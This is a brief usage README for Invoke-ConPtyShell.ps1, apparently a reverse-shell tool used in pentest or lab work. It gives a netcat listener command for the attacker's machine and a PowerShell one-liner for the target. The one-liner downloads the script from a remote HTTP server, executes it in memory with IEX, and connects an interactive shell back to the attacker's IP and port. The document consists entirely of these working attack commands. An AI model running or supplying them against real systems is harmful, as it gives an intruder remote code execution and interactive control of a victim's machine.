# How to use this scripts

## Invoke-ConPtyShell.ps1
On one console:
```
stty raw -echo; (stty size; cat) | nc -lvnp 3340
```

On the target machine
```
powershell.exe IEX(IWR http://10.10.15.156:8000/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.15.156 3340
```
